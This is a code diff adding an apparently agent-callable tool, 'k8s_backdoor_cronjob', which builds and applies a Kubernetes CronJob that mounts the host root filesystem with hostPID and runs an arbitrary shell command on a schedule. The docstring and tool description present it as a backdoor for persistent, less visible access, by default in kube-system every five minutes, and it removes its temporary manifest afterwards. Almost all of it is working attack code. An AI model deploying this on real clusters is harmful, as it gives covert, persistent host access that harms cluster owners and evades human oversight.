+    ) -> ToolResult:
+        """Deploy a CronJob backdoor that periodically executes commands.
+
+        Creates a CronJob in the cluster. Less visible than a DaemonSet and
+        executes on schedule. Equivalent to CDK's k8s-cronjob.
+
+        Use when: you want persistent but less visible access than a DaemonSet.
+        """
+        cj_name = f"cdk-cron-{''.join(random.choices(string.ascii_lowercase, k=4))}"
+        yaml_config = f"""apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: {cj_name}
+  namespace: {namespace}
+spec:
+  schedule: "{schedule}"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          hostPID: true
+          containers:
+          - name: cron
+            image: {image}
+            command: ["/bin/sh", "-c"]
+            args: ["{shell_cmd}"]
+            volumeMounts:
+            - name: host-root
+              mountPath: /host
+          volumes:
+          - name: host-root
+            hostPath:
+              path: /
+          restartPolicy: OnFailure
+"""
+        deploy_cmd = (
+            f"echo '{yaml_config}' > /tmp/{cj_name}.yaml && "
+            f"kubectl apply -f /tmp/{cj_name}.yaml 2>&1; "
+            f"echo '=== CronJob created ===' && "
+            f"kubectl get cronjobs -n {namespace} {cj_name} 2>&1; "
+            f"rm /tmp/{cj_name}.yaml 2>/dev/null"
+        )
+        result = await _run_shell(deploy_cmd, timeout=30)
+        return ToolResult(tool_name="k8s_backdoor_cronjob", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="k8s_backdoor_cronjob",
+        func=k8s_backdoor_cronjob,
+        description="DEPLOY CronJob backdoor for persistent periodic access. Creates a scheduled job that executes your command on the host (via hostPath mount). Less visible than DaemonSet. Use when you need persistent access but want lower visibility. Default schedule runs every 5 minutes.",
+        parameters={
+            "image": {"type": "string", "description": "Container image (default 'busybox')"},
+            "shell_cmd": {"type": "string", "description": "Shell command to execute on the host (via /host mount point)"},
+            "schedule": {"type": "string", "description": "Cron schedule (default '*/5 * * * *' = every 5 minutes)"},
+            "namespace": {"type": "string", "description": "Target namespace (default 'kube-system')"},
         },
     )
 
